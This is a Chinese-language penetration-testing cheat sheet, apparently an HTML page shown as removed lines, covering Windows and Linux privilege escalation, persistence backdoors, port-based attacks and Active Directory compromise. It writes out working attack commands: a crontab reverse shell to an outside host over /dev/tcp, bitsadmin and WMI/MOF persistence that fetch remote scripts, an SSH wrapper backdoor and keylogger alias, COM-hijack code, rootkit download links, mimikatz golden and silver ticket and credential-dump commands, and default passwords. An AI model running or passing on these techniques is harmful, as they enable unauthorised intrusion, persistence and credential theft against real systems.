-<li>漏洞信息收集等</li>
-</ul>
-<h2 id="6、权限提升"><a href="#6、权限提升" class="headerlink" title="6、权限提升"></a>6、权限提升</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
-<li><p>BypassUAC</p>
-<ul>
-<li><p>常用方法</p>
-<ul>
-<li>使用IFileOperation COM接口<br>使用Wusa.exe的extract选项<br>远程注入SHELLCODE 到傀儡进程<br>DLL劫持，劫持系统的DLL文件<br>eventvwr.exe and registry hijacking<br>sdclt.exe<br>SilentCleanup<br>wscript.exe<br>cmstp.exe<br>修改环境变量，劫持高权限.Net程序<br>修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序<br>直接提权过UAC</li>
-</ul>
-</li>
-<li><p>常用工具</p>
-<ul>
-<li>UACME</li>
-<li>Bypass-UAC</li>
-<li>Yamabiko</li>
-<li>…</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>提权</p>
-<ul>
-<li><p>windows内核漏洞提权</p>
-<ul>
-<li><p>检测类</p>
-<ul>
-<li>Windows-Exploit-Suggester</li>
-<li>WinSystemHelper</li>
-</ul>
-</li>
-<li><p>利用类</p>
-<ul>
-<li>windows-kernel-exploits</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>服务提权</p>
-<ul>
-<li>数据库服务，ftp服务等</li>
-</ul>
-</li>
-<li><p>WINDOWS错误系统配置</p>
-</li>
-<li>系统服务的错误权限配置漏洞</li>
-<li>不安全的注册表权限配置</li>
-<li>不安全的文件/文件夹权限配置</li>
-<li>计划任务</li>
-<li>任意用户以NT AUTHORITY\SYSTEM权限安装msi</li>
-<li><p>提权脚本</p>
-<ul>
-<li>PowerUP</li>
-<li>ElevateKit</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul>
-<li><p>内核溢出提权</p>
-<ul>
-<li>linux-kernel-exploits</li>
-</ul>
-</li>
-<li><p>计划任务</p>
-<ul>
-<li>crontab -l<br>ls -alh /var/spool/cron<br>ls -al /etc/ | grep cron<br>ls -al /etc/cron<em><br>cat /etc/cron</em><br>cat /etc/at.allow<br>cat /etc/at.deny<br>cat /etc/cron.allow<br>cat /etc/cron.deny<br>cat /etc/crontab<br>cat /etc/anacrontab<br>cat /var/spool/cron/crontabs/root</li>
-</ul>
-</li>
-<li><p>SUID</p>
-<ul>
-<li>find / -user root -perm -4000 -print 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb {} \;</li>
-</ul>
-</li>
-<li><p>系统服务的错误权限配置漏洞</p>
-<ul>
-<li>cat /var/apache2/config.inc<br>cat /var/lib/mysql/mysql/user.MYD<br>cat /root/anaconda-ks.cfg</li>
-</ul>
-</li>
-<li><p>不安全的文件/文件夹权限配置</p>
-<ul>
-<li>cat ~/.bash_history<br>cat ~/.nano_history<br>cat ~/.atftp_history<br>cat ~/.mysql_history<br>cat ~/.php_history</li>
-</ul>
-</li>
-<li><p>找存储的明文用户名，密码</p>
-<ul>
-<li>grep -i user [filename]<br>grep -i pass [filename]<br>grep -C 5 “password” [filename]<br>find . -name “*.php” -print0 | xargs -0 grep -i -n “var $password” # Joomla</li>
-</ul>
-</li>
-</ul>
-<h2 id="7、权限维持"><a href="#7、权限维持" class="headerlink" title="7、权限维持"></a>7、权限维持</h2><h3 id="系统后门"><a href="#系统后门" class="headerlink" title="系统后门"></a>系统后门</h3><ul>
-<li><p>windows</p>
-<ul>
-<li><p>1、密码记录工具</p>
-<ul>
-<li>WinlogonHack<br>WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。<br>键盘记录器<br>安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。<br>NTPass<br>获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。<br>Linux 下 openssh 后门<br>重新编译运行的sshd服务，用于记录用户的登陆密码。</li>
-</ul>
-</li>
-<li><p>2、常用的存储Payload位置</p>
-<ul>
-<li><p>WMI</p>
-<ul>
-<li>存储：<br>$StaticClass = New-Object Management.ManagementClass(‘root\cimv2’, $null,$null)<br>$StaticClass.Name = ‘Win32_Command’<br>$StaticClass.Put()<br>$StaticClass.Properties.Add(‘Command’ , $Payload)<br>$StaticClass.Put() </li>
-<li>读取:<br>$Payload=([WmiClass] ‘Win32_Command’).Properties[‘Command’].Value</li>
-</ul>
-</li>
-<li><p>包含数字签名的PE文件：利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名</p>
-</li>
-<li><p>特殊ADS</p>
-<ul>
-<li><p>特殊COM文件</p>
-<ul>
-<li>type putty.exe &gt; \.\C:\test\ads\COM1:putty.exe<br>wmic process call create \.\C:\test\ads\COM1:putty.exe</li>
-</ul>
-</li>
-<li><p>磁盘根目录</p>
-<ul>
-<li>type putty.exe &gt;C:\:putty.exe<br>wmic process call create C:\:putty.exe</li>
-</ul>
-</li>
-<li><p>…</p>
-<ul>
-<li>type putty.exe &gt; …:putty.exe<br>wmic process call create c:\test\ads...:putty.exe</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>3、Run/RunOnce Keys</p>
-<ul>
-<li><p>用户级</p>
-<ul>
-<li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</li>
-</ul>
-</li>
-<li><p>管理员</p>
-<ul>
-<li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>4、BootExecute Key</p>
-<ul>
-<li>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：<br>HKLM\SYSTEM\CurrentControlSet\Control\hivelist<br>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</li>
-</ul>
-</li>
-<li><p>5、Userinit Key</p>
-<ul>
-<li>WinLogon进程加载的login scripts,具体键值：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</li>
-</ul>
-</li>
-<li><p>6、Startup Keys</p>
-<ul>
-<li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</li>
-</ul>
-</li>
-<li><p>7、Services</p>
-<ul>
-<li><p>创建服务</p>
-<ul>
-<li>sc create [ServerName] binPath= BinaryPathName</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>8、Browser Helper Objects</p>
-<ul>
-<li>本质上是Internet Explorer启动时加载的DLL模块<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</li>
-</ul>
-</li>
-<li><p>9、AppInit_DLLs</p>
-<ul>
-<li>加载User32.dll会加载的DLL<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</li>
-</ul>
-</li>
-<li><p>10、文件关联</p>
-<ul>
-<li>HKEY_LOCAL_MACHINE\Software\Classes<br>HKEY_CLASSES_ROOT</li>
-</ul>
-</li>
-<li><p>11、bitsadmin</p>
-<ul>
-<li>bitsadmin /create backdoor<br>bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe<br>bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe “/u /s /i:<a href="https://host.com/calc.sct" target="_blank" rel="noopener">https://host.com/calc.sct</a> scrobj.dll”<br>bitsadmin /Resume backdoor</li>
-</ul>
-</li>
-<li><p>12、mof</p>
-<ul>
-<li><p>pragma namespace(“\\.\root\subscription”)<br>instance of <strong>EventFilter as $EventFilter<br>{<br>EventNamespace = “Root\Cimv2”;<br>Name = “filtP1”;<br>Query = “Select * From </strong>InstanceModificationEvent “<br>“Where TargetInstance Isa \”Win32_LocalTime\” “<br>“And TargetInstance.Second = 1”;<br>QueryLanguage = “WQL”;<br>};<br>instance of ActiveScriptEventConsumer as $Consumer<br>{<br>Name = “consP1”;<br>ScriptingEngine = “JScript”;<br>ScriptText = “GetObject(\”script:<a href="https://host.com/test\&quot;)&quot;" target="_blank" rel="noopener">https://host.com/test\&quot;)&quot;</a>;<br>};<br>instance of __FilterToConsumerBinding<br>{<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>};</p>
-<ul>
-<li>管理员执行：<br>mofcomp test.mof</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>13、wmi</p>
-<ul>
-<li>每隔60秒执行一次notepad.exe<br>wmic /NAMESPACE:”\root\subscription” PATH <strong>EventFilter CREATE Name=”BotFilter82”, EventNameSpace=”root\cimv2”,QueryLanguage=”WQL”, Query=”SELECT * FROM </strong>InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ‘Win32_PerfFormattedData_PerfOS_System’”<br>wmic /NAMESPACE:”\root\subscription” PATH CommandLineEventConsumer CREATE Name=”BotConsumer23”, ExecutablePath=”C:\Windows\System32\notepad.exe”,CommandLineTemplate=”C:\Windows\System32\notepad.exe”<br>wmic /NAMESPACE:”\root\subscription” PATH <strong>FilterToConsumerBinding CREATE Filter=”</strong>EventFilter.Name=\”BotFilter82\””, Consumer=”CommandLineEventConsumer.Name=\”BotConsumer23\””</li>
-</ul>
-</li>
-<li><p>14、Userland Persistence With Scheduled Tasks</p>
-<ul>
-<li><p>劫持计划任务UserTask，在系统启动时加载dll</p>
-<ul>
-<li>function Invoke-ScheduledTaskComHandlerUserTask<br>{<br>[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = ‘Medium’)]<br>Param (<br>[Parameter(Mandatory = $True)]<br>[ValidateNotNullOrEmpty()]<br>[String]<br>$Command,</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>[Switch]<br>$Force<br>)<br>$ScheduledTaskCommandPath = “HKCU:\Software\Classes\CLSID{58fb76b9-ac85-4e55-ac04-427593b1d060}\InprocServer32”<br>if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name ‘(default)’ -ErrorAction SilentlyContinue) -eq $null)){<br>New-Item $ScheduledTaskCommandPath -Force |<br>New-ItemProperty -Name ‘(Default)’ -Value $Command -PropertyType string -Force | Out-Null<br>}else{<br>Write-Verbose “Key already exists, consider using -Force”<br>exit<br>}</p>
-<p>if (Test-Path $ScheduledTaskCommandPath) {<br>Write-Verbose “Created registry entries to hijack the UserTask”<br>}else{<br>Write-Warning “Failed to create registry key, exiting”<br>exit<br>}<br>}<br>Invoke-ScheduledTaskComHandlerUserTask -Command “C:\test\testmsg.dll” -Verbose</p>
-<pre><code>- 15、Netsh
-
-    - netsh add helper c:\test\netshtest.dll
-
-        - dll编写
-
-            - 后门触发：每次调用netsh
-
-- 16、Shim
-
-    - 常用方式：
-</code></pre><p>InjectDll<br>RedirectShortcut<br>RedirectEXE</p>
-<pre><code>- 17、DLL劫持
-
-    - 通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程
-</code></pre><p>使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用<br>AheadLib配合生成dll劫持利用源码不会影响程序执行</p>
-<pre><code>- 工具：https://github.com/sensepost/rattler
-</code></pre><p>工具：<a href="https://github.com/Yonsm/AheadLib" target="_blank" rel="noopener">https://github.com/Yonsm/AheadLib</a></p>
-<pre><code>- 18、DoubleAgent
-
-    - 编写自定义Verifier provider DLL
-</code></pre><p>通过Application Verifier进行安装<br>注入到目标进程执行payload<br>每当目标进程启动，均会执行payload，相当于一个自启动的方式</p>
-<pre><code>        - POC : https://github.com/Cybellum/DoubleAgent
-
-- 19、waitfor.exe
-
-    - 不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe
-
-        - POC : https://github.com/3gstudent/Waitfor-Persistence
-
-- 20、AppDomainManager
-
-    - 针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。
-</code></pre><p>如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</p>
-<pre><code>- 21、Office
-
-    - 劫持Office软件的特定功能
-
-        - 通过dll劫持,在Office软件执行特定功能时触发后门
-
-    - Office加载项
-
-        - Word WLL 
-</code></pre><p>Excel XLL<br>Excel VBA add-ins<br>PowerPoint VBA add-ins</p>
-<pre><code>- POC：https://github.com/3gstudent/Office-Persistence
-
-    - 参考1 ：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/
-</code></pre><p>参考2 ：<a href="https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/</a></p>
-<pre><code>    - 利用VSTO实现的office后门
-
-- 22、CLR
-
-    - 无需管理员权限的后门，并能够劫持所有.Net程序
-
-        - POC:https://github.com/3gstudent/CLR-Injection
-
-- 23、msdtc
-
-    - 利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测
-
-        - 向 %windir%\system32\目录添加dll并重命名为oci.dll
-
-- 24、Hijack CAccPropServicesClass and MMDeviceEnumerato
-
-    - 利用COM组件，不需要重启系统，不需要管理员权限
-</code></pre><p>通过修改注册表实现</p>
-<pre><code>        - POC：https://github.com/3gstudent/COM-Object-hijacking
-
-- 25、Hijack explorer.exe
-
-    - COM组件劫持，不需要重启系统，不需要管理员权限
-</code></pre><p>通过修改注册表实现</p>
-<pre><code>- HKCU\Software\Classes\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}
-</code></pre><p>HKCU\Software\Classes\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9}<br>HKCU\Software\Classes\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}<br>HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}</p>
-<pre><code>- 26、Windows FAX DLL Injection
-
-    - 通过DLL劫持，劫持Explorer.exe对fxsst.dll的加载
-</code></pre><p>Explorer.exe在启动时会加载c：\Windows\System32\fxsst.dll(服务默认开启，用于传真服务)<br>将payload.dll保存在c：\Windows\fxsst.dll，能够实现dll劫持，劫持Explorer.exe对fxsst.dll的加载</p>
-<pre><code>- 27、特殊注册表键值
-
-    - 在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)
-
-        - 《渗透技巧——&quot;隐藏&quot;注册表的创建》
-        - 《渗透技巧——&quot;隐藏&quot;注册表的更多测试》
-
-- 28、快捷方式后门
-
-    - 替换我的电脑快捷方式启动参数
-
-        - POC : https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1
-
-- 29、Logon Scripts
-
-    - New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null
-
-- 30、Password Filter DLL
-- 31、利用BHO实现IE浏览器劫持
-</code></pre><ul>
-<li><p>Linux</p>
-<ul>
-<li><p>crontab</p>
-<ul>
-<li><p>每60分钟反弹一次shell给dns.wuyun.org的53端口</p>
-<ul>
-<li>#!bash<br>(crontab -l;printf “<em>/60 </em> <em> </em> * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&9;exec 1&gt;&amp;9 2&gt;&1;/bin/bash –noprofile -i;\rno crontab for <code>whoami</code>%100c\n”)|crontab -</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>硬链接sshd</p>
-<ul>
-<li><p>#!bash<br>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;</p>
-<ul>
-<li>链接：ssh <a href="mailto:root@192.168.206.142" target="_blank" rel="noopener">root@192.168.206.142</a> -p 2333</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>SSH Server wrapper</p>
-<ul>
-<li>#!bash<br>cd /usr/sbin<br>mv sshd ../bin<br>echo ‘#!/usr/bin/perl’ &gt;sshd</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>echo ‘exec “/bin/sh” if (getpeername(STDIN) =~ /^..4A/);’ &gt;&gt;sshd</p>
-<p>echo ‘exec {“/usr/bin/sshd”} “/usr/sbin/sshd”,@ARGV,’ &gt;&gt;sshd<br>chmod u+x sshd<br>//不用重启也行<br>/etc/init.d/sshd restart</p>
-<pre><code>        - socat STDIO TCP4:192.168.206.142:22,sourceport=13377
-
-- SSH keylogger
-
-    - vim当前用户下的.bashrc文件,末尾添加
-</code></pre><p>#!bash<br>alias ssh=’strace -o /tmp/sshpwd-<code>date &#39;+%d%h%m%s&#39;</code>.log -e read,write,connect -s2048 ssh’</p>
-<pre><code>        - source .bashrc
-
-- Cymothoa_进程注入backdoor
-
-    - ./cymothoa -p 2270 -s 1 -y 7777
-
-        - nc -vv ip 7777
-
-- rookit
-
-    - openssh_rookit
-
-        - http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
-
-    - Kbeast_rootkit
-
-        - http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz
-
-    - Mafix + Suterusu rookit
-
-- Tools：
-
-    - Vegile
-    - backdoor
-</code></pre><h3 id="web后门"><a href="#web后门" class="headerlink" title="web后门"></a>web后门</h3><ul>
-<li>PHP Meterpreter后门</li>
-<li>Aspx Meterpreter后门</li>
-<li>weevely</li>
-<li>webacoo</li>
-</ul>
-<h2 id="8、横向渗透"><a href="#8、横向渗透" class="headerlink" title="8、横向渗透"></a>8、横向渗透</h2><h3 id="工作组渗透"><a href="#工作组渗透" class="headerlink" title="工作组渗透"></a>工作组渗透</h3><ul>
-<li><p>端口渗透</p>
-<ul>
-<li><p>端口扫描</p>
-<ul>
-<li>1.端口的指纹信息（版本信息）</li>
-<li>2.端口所对应运行的服务</li>
-<li>3.常见的默认端口号</li>
-<li>4.尝试弱口令</li>
-</ul>
-</li>
-<li><p>端口爆破</p>
-<ul>
-<li>hydra</li>
-</ul>
-</li>
-<li><p>端口弱口令</p>
-<ul>
-<li>NTScan</li>
-<li>Hscan</li>
-<li>字写脚本</li>
-</ul>
-</li>
-<li><p>端口溢出</p>
-<ul>
-<li><p>smb</p>
-<ul>
-<li>ms08067</li>
-<li>ms17010</li>
-<li>ms11058</li>
-<li>…</li>
-</ul>
-</li>
-<li><p>apache</p>
-</li>
-<li>ftp</li>
-<li>…</li>
-</ul>
-</li>
-<li><p>常见的默认端口</p>
-<ul>
-<li><p>1、web类(web漏洞/敏感目录)</p>
-<ul>
-<li>第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix<br>80 web<br>80-89 web<br>8000-9090 web</li>
-</ul>
-</li>
-<li><p>2、数据库类(扫描弱口令)</p>
-<ul>
-<li>1433 MSSQL<br>1521 Oracle<br>3306 MySQL<br>5432 PostgreSQL<br>50000 DB2</li>
-</ul>
-</li>
-<li><p>3、特殊服务类(未授权/命令执行类/漏洞)</p>
-<ul>
-<li>443 SSL心脏滴血<br>445 ms08067/ms11058/ms17010等<br>873 Rsync未授权<br>5984 CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="noopener">http://xxx:5984/_utils/</a><br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问 </li>
-</ul>
-</li>
-<li><p>4、常用端口类(扫描弱口令/端口爆破)</p>
-<ul>
-<li>21 ftp<br>22 SSH<br>23 Telnet<br>445 SMB弱口令扫描<br>2601,2604 zebra路由，默认密码zebra<br>3389 远程桌面 </li>
-</ul>
-</li>
-<li><p>5、端口合计所对应的服务：</p>
-<ul>
-<li>21 ftp<br>22 SSH<br>23 Telnet<br>25 SMTP<br>53 DNS<br>69 TFTP<br>80 web<br>80-89 web<br>110 POP3<br>135 RPC<br>139 NETBIOS<br>143 IMAP<br>161 SNMP<br>389 LDAP<br>443 SSL心脏滴血以及一些web漏洞测试<br>445 SMB<br>512,513,514 Rexec<br>873 Rsync未授权<br>1025,111 NFS<br>1080 socks<br>1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案<br>1433 MSSQL (暴力破解)<br>1521 Oracle:(iSqlPlus Port:5560,7778)<br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>2222 DA虚拟主机管理系统登陆 （国外用较多）<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>3306 MySQL （暴力破解）<br>3312/3311 kangle主机管理系统登陆<br>3389 远程桌面<br>3690 svn<br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网<br>4848 GlassFish web中间件 弱口令:admin/adminadmin<br>5432 PostgreSQL<br>5900 vnc<br>5984 CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="noopener">http://xxx:5984/_utils/</a><br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>7778 Kloxo主机控制面板登录<br>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>8080 tomcat/WDCd/ 主机管理系统，默认弱口令<br>8080,8089,9090 JBOSS<br>8081 Symantec AV/Filter for MSE<br>8083 Vestacp主机管理系统 （国外用较多）<br>8649 ganglia<br>8888 amh/LuManager 主机管理系统默认端口<br>9000 fcgi fcig php执行<br>9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>28017 mongodb统计页面<br>50000 SAP命令执行<br>50060 hadoop<br>50070,50030 hadoop默认端口未授权访问</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h3><ul>
-<li><p>信息搜集</p>
-<ul>
-<li><p>powerview.ps1</p>
-<ul>
-<li>Get-NetDomain - gets the name of the current user’s domain<br>Get-NetForest - gets the forest associated with the current user’s domain<br>Get-NetForestDomains - gets all domains for the current forest<br>Get-NetDomainControllers - gets the domain controllers for the current computer’s domain<br>Get-NetCurrentUser - gets the current [domain]username<br>Get-NetUser - returns all user objects, or the user specified (wildcard specifiable)<br>Get-NetUserSPNs - gets all user ServicePrincipalNames<br>Get-NetOUs - gets data for domain organization units<br>Get-NetGUIDOUs - finds domain OUs linked to a specific GUID<br>Invoke-NetUserAdd - adds a local or domain user<br>Get-NetGroups - gets a list of all current groups in the domain<br>Get-NetGroup - gets data for each user in a specified domain group<br>Get-NetLocalGroups - gets a list of localgroups on a remote host or hosts<br>Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts<br>Get-NetLocalServices - gets a list of running services/paths on a remote host or hosts<br>Invoke-NetGroupUserAdd - adds a user to a specified local or domain group<br>Get-NetComputers - gets a list of all current servers in the domain<br>Get-NetFileServers - get a list of file servers used by current domain users<br>Get-NetShare - gets share information for a specified server<br>Get-NetLoggedon - gets users actively logged onto a specified server<br>Get-NetSessions - gets active sessions on a specified server<br>Get-NetFileSessions - returned combined Get-NetSessions and Get-NetFiles<br>Get-NetConnections - gets active connections to a specific server resource (share)<br>Get-NetFiles - gets open files on a server<br>Get-NetProcesses - gets the remote processes and owners on a remote server</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>获取域控的方法</p>
-<ul>
-<li><p>SYSVOL</p>
-<ul>
-<li><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。</p>
-<ul>
-<li>寻找SYSVOL里的密码和攻击GPP（组策略偏好）</li>
-<li>Windows Server 2008 R2之四管理Sysvol文件夹</li>
-<li>SYSVOL中查找密码并利用组策略首选项</li>
-<li>利用SYSVOL还原组策略中保存的密码</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>MS14-068 Kerberos</p>
-<ul>
-<li><p>python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机<br>利用mimikatz将工具得到的<a href="mailto:TGT_domainuser@SERVER.COM.ccache" target="_blank" rel="noopener">TGT_domainuser@SERVER.COM.ccache</a>写入内存，创建缓存证书：<br>mimikatz.exe “kerberos::ptc c:<a href="mailto:TGT_darthsidious@pentest.com.ccache" target="_blank" rel="noopener">TGT_darthsidious@pentest.com.ccache</a>“ exit<br>net use k: \pentest.comc$</p>
-<ul>
-<li>Kerberos的工具包PyKEK</li>
-<li>深入解读MS14-068漏洞</li>
-<li>Kerberos的安全漏洞</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>SPN扫描</p>
-<ul>
-<li><p>Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。<br>SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。<br>SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。</p>
-<ul>
-<li><p>参考</p>
-<ul>
-<li>非扫描式的SQL Server发现</li>
-<li>SPN扫描</li>
-<li>扫描SQLServer的脚本</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Kerberos的黄金门票</p>
-<ul>
-<li><p>在域上抓取的哈希<br>lsadump::dcsync /domain:pentest.com /user:krbtgt</p>
-<ul>
-<li><p>kerberos::purge<br>kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribi<br>kerberos::ptt administrator.kiribi<br>kerberos::tgt<br>net use k: \pentest.comc$</p>
-<ul>
-<li><a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">https://adsecurity.org/?p=1640</a></li>
-<li>域服务账号破解实践</li>
-<li>Kerberos的认证原理</li>
-<li>深刻理解windows安全认证机制ntlm＆Kerberos</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Kerberos的银票务</p>
-<ul>
-<li><p>黄金票据和白银票据的一些区别：<br>Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限<br>银票：伪造TGS，只能访问指定的服务<br>加密方式不同：<br>Golden Ticket由krbtgt的hash加密<br>Silver Ticket由服务账号（通常为计算机账户）Hash加密<br>认证流程不同：<br>金票在使用的过程需要同域控通信<br>银票在使用的过程不需要同域控通信</p>
-<ul>
-<li><p>mimikatz.exe “kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt”</p>
-<ul>
-<li>攻击者如何使用Kerberos的银票来利用系统</li>
-<li><a href="https://www.feiworks.com/wy/drops/域渗透--pass％第二十条％20Ticket.pdf" target="_blank" rel="noopener">https://www.feiworks.com/wy/drops/域渗透--pass％第二十条％20Ticket.pdf</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>域服务账号破解</p>
-<ul>
-<li><p>与上面SPN扫描类似的原理</p>
-<ul>
-<li><p><a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a></p>
-<ul>
-<li>获取所有用作SPN的帐户<br>setspn -T PENTEST.com -Q <em>/</em><br>从Mimikatz的RAM中提取获得的门票<br>kerberos::list /export<br>用rgsrepcrack破解<br>tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>凭证盗窃</p>
-<ul>
-<li>从搜集的密码里面找管理员的密码</li>
-</ul>
-</li>
-<li><p>地址解析协议</p>
-<ul>
-<li>实在搞不定再搞ARP</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>获取AD哈希</p>
-<ul>
-<li>使用VSS卷影副本</li>
-<li>Ntdsutil中获取NTDS.DIT​​文件</li>
-<li><p>PowerShell中提取NTDS.DIT</p>
-<ul>
-<li>Invoke-NinaCopy</li>
-</ul>
-</li>
-<li><p>使用Mimikatz提取</p>
-<ul>
-<li>mimikatz lsadump::lsa /inject exit</li>
-</ul>
-</li>
